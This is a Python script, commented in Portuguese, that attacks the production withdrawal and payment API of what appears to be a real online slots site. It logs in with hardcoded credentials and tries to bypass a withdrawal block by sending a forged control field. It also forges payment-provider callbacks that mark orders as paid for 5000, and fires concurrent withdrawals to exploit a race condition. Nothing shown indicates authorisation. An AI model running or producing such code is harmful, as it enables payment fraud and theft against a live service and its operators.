"""
1. Ver os dados do banco cadastrado
2. Testar saque com o ID do banco cadastrado
3. Entender por que 103007 ainda aparece
4. Testar idempotency / replay de orderId
"""
import ssl, urllib.request, urllib.error, json, time, threading
from datetime import datetime, timezone

ctx = ssl.create_default_context()
ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
BASE  = "https://ds.amizade777.com"
PHONE = "21998498419"
DID   = "0beb614f-8838-43ef-00fc-0029f7d5d20f"
PKG   = "com.slots.big"

RESULTS = []

def req(method, path, body=None, token=None):
    h = {"User-Agent":"Mozilla/5.0","Accept":"application/json, */*",
         "Origin":BASE,"Referer":BASE+"/"}
    if body is not None: h["Content-Type"] = "application/json"
    if token: h["Token"] = str(token)
    data = json.dumps(body).encode() if body is not None else None
    try:
        r = urllib.request.Request(BASE+path, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=12, context=ctx) as resp:
            raw = resp.read(16384).decode("utf-8","ignore")
            try: return resp.status, json.loads(raw)
            except: return resp.status, {"_raw": raw[:600]}
    except urllib.error.HTTPError as e:
        raw = e.read(8192).decode("utf-8","ignore") if e.fp else ""
        try: return e.code, json.loads(raw)
        except: return e.code, {"_raw": raw[:400]}
    except Exception as ex:
        return 0, {"err": str(ex)}

def login():
    pl = {"appChannel":"pc","appPackageName":PKG,"deviceId":DID,
          "deviceModel":"WEB","deviceVersion":"WEB","appVersion":"1.0.0",
          "sysTimezone":None,"sysLanguage":None,"phone":PHONE,"password":PHONE}
    st, b = req("POST", "/prod-api/player/sign-in", pl)
    if b.get("code") != 200: raise RuntimeError(str(b.get("msg")))
    return b["data"]["token"], b["data"]["user_info"]

def rec(cat, test, code, msg, data, interp, sev="info"):
    icons = {"critical":"🔴","high":"🟠","medium":"🟡","low":"🔵","info":"⚪"}
    e = {"cat":cat,"test":test,"code":code,"msg":msg,"data":data,"interp":interp,"sev":sev}
    RESULTS.append(e)
    print(f"  {icons.get(sev,'⚪')} [{cat}/{test[:55]}] code={code} msg={msg!r}")
    if sev in ("critical","high"): print(f"     ↪ {interp}")

# ─── 1. Ver banco cadastrado ──────────────────────────────────

print("=" * 60)
print("1. BANCO CADASTRADO — DETALHES")
print("=" * 60)

tok, ui = login()
print(f"Token: {tok}")
print(f"pay_account_id: {ui.get('pay_account_id')}")

# Pegar os dados do banco via player/info
st, b = req("POST", "/prod-api/player/info", {"token": tok, "appPackageName": PKG}, tok)
if b.get("code") == 200:
    data = b.get("data", {})
    bank = data.get("bank", {})
    pay_acct = data.get("pay_account", {})
    print(f"\nDados de banco (bank): {json.dumps(bank, ensure_ascii=False, indent=2)}")
    print(f"Dados de pay_account: {json.dumps(pay_acct, ensure_ascii=False, indent=2)}")
    print(f"\nEstrutura completa bank da login resp: {json.dumps(b['data'].get('bank',{}), ensure_ascii=False)}")

# Ver detalhes do pay-service/bank
st, b = req("POST", "/prod-api/pay-service/bank", {"token": tok, "appPackageName": PKG}, tok)
print(f"\n/prod-api/pay-service/bank: code={b.get('code')}")
if b.get("code") == 200:
    print(f"  data: {json.dumps(b.get('data'), ensure_ascii=False, indent=2)[:600]}")

# ─── 2. Entender o pré-requisito do saque ────────────────────

print("\n" + "=" * 60)
print("2. PRÉ-REQUISITOS DO SAQUE (análise do config)")
print("=" * 60)

# withdraw_control: -1 significa que o saque está BLOQUEADO pra essa conta
# O campo withdraw_model controla o fluxo de validação
# withdraw_control=-1 → conta bloqueada de sacar (por admin ou por regra)
# withdraw_control=0  → normal
# withdraw_control=1  → especial

# Tentar saque com withdraw_control diferente no body
tok, _ = login()
for wc in [-1, 0, 1]:
    st, b = req("POST", "/prod-api/payment/balance-less",
                {"token": tok, "appPackageName": PKG, "appVersion":"1.0.0",
                 "phone": PHONE, "amount": 10, "withdraw_control": wc}, tok)
    print(f"  withdraw_control={wc}: code={b.get('code')} msg={b.get('msg','')!r}")

# ─── 3. Saque correto — usando o ID do banco cadastrado ──────

print("\n" + "=" * 60)
print("3. SAQUE COM BANCO ID CORRETO")
print("=" * 60)

tok, _ = login()
# Primeiro pegar o ID do banco cadastrado
st, b = req("POST", "/prod-api/player/info", {"token": tok, "appPackageName": PKG}, tok)
bank_data = b.get("data", {}).get("bank", {}) if b.get("code") == 200 else {}
bank_id = bank_data.get("id") or bank_data.get("bankId") or bank_data.get("bank_id")
print(f"  bank_data completo: {bank_data}")
print(f"  bank_id: {bank_id}")

# Testar saque com o bank_id
payloads_saque = [
    # Com bankId
    {"amount": 10, "bankId": bank_id} if bank_id else None,
    {"amount": 10, "bank_id": bank_id} if bank_id else None,
    # Com PIX direto
    {"amount": 10, "pixKey": PHONE, "pixType": 3},
    {"amount": 10, "account": PHONE, "accountType": 3, "bankCode": "PIX"},
    {"amount": 10},  # mínimo absoluto
    # Ver se o erro muda com saldo 0
    {"amount": 1000000},  # acima do saldo
]

for payload in payloads_saque:
    if payload is None: continue
    tok2, _ = login()
    full = dict(payload, token=tok2, appPackageName=PKG, appVersion="1.0.0", phone=PHONE)
    st, b = req("POST", "/prod-api/payment/balance-less", full, tok2)
    code = b.get("code"); msg = str(b.get("msg",""))[:70]
    if code not in (103007,):
        rec("saque", str(payload)[:60], code, msg, b.get("data"),
            f"Código diferente! code={code}",
            "critical" if code == 200 else "medium" if code not in (103007, 103012, 400, 401, 403) else "info")
    else:
        print(f"  {payload}: code={code} msg={msg!r}")
    time.sleep(0.5)

# ─── 4. Replay de orderId ─────────────────────────────────────

print("\n" + "=" * 60)
print("4. REPLAY E CONSULTA DE ORDENS")
print("=" * 60)

ORDER_IDS = [
    "45DEDD41C527ECF8",
    "9E75029CA767D3E0",
    "F1993D061F91EB8F",
]

tok, _ = login()
for oid in ORDER_IDS[:3]:
    # Consultar status
    for path in [
        f"/prod-api/pay-service/order/{oid}",
        f"/prod-api/pay-service/recharge/{oid}",
        f"/prod-api/order/query?orderId={oid}",
        f"/prod-api/pay-service/recharge/query?orderId={oid}",
    ]:
        st, b = req("GET", path, token=tok)
        code = b.get("code")
        if code not in (None, 404, 405):
            print(f"  GET {path}: code={code} data={b.get('data')}")
        time.sleep(0.2)

    # Reprocessar ordem
    tok2, _ = login()
    for path in [
        "/prod-api/pay-service/recharge/callback",
        "/prod-api/pay-service/recharge/notify",
        "/prod-api/pay-service/notify",
        "/prod-api/payment/notify",
    ]:
        st, b = req("POST", path, {"orderId": oid, "status": 1,
                                    "amount": 5000, "token": tok2}, tok2)
        code = b.get("code")
        if code not in (None, 404, 405, 400):
            print(f"  POST {path} orderId={oid}: code={code} msg={b.get('msg')!r}")
            if code == 200:
                rec("replay", f"order_{oid}", code, str(b.get("msg")),
                    b.get("data"), f"REPLAY ACEITO! orderId={oid}", "critical")
        time.sleep(0.2)

# ─── 5. Race condition com banco cadastrado ───────────────────

print("\n" + "=" * 60)
print("5. RACE CONDITION (com banco cadastrado)")
print("=" * 60)

tok_race, _ = login()
results_race = []
lock = threading.Lock()

def race_saque(n):
    payload = {"token": tok_race, "appPackageName": PKG, "appVersion":"1.0.0",
               "phone": PHONE, "amount": 10}
    st, b = req("POST", "/prod-api/payment/balance-less", payload, tok_race)
    with lock:
        results_race.append({"n":n,"code":b.get("code"),"msg":str(b.get("msg",""))[:50]})

threads = [threading.Thread(target=race_saque, args=(i,)) for i in range(8)]
for t in threads: t.start()
for t in threads: t.join(timeout=20)

accepted = [r for r in results_race if r["code"] == 200]
print(f"  8 threads | {len(accepted)} aceitos")
for r in results_race:
    icon = "🔴" if r["code"]==200 else "⚪"
    print(f"  {icon} Thread {r['n']}: code={r['code']} msg={r['msg']!r}")

if len(accepted) >= 2:
    rec("race", "withdraw_8x", 200, "race", {"accepted": len(accepted)},
        f"RACE CONDITION! {len(accepted)} de 8 aceitos!", "critical")

# ─── Salvar ────────────────────────────────────────────────────

with open("saque_v2_resultados.json","w",encoding="utf-8") as f:
    json.dump(RESULTS, f, ensure_ascii=False, indent=2, default=str)

crits = [e for e in RESULTS if e["sev"] in ("critical","high","medium")]
print(f"\n{'='*60}")
print(f"RESUMO: {len(crits)} achados")
for e in crits:
    icons = {"critical":"🔴","high":"🟠","medium":"🟡"}
    print(f"  {icons.get(e['sev'],'?')} {e['cat']}/{e['test']}")
    print(f"    {e['interp'][:100]}")
print(f"\n✅ saque_v2_resultados.json")
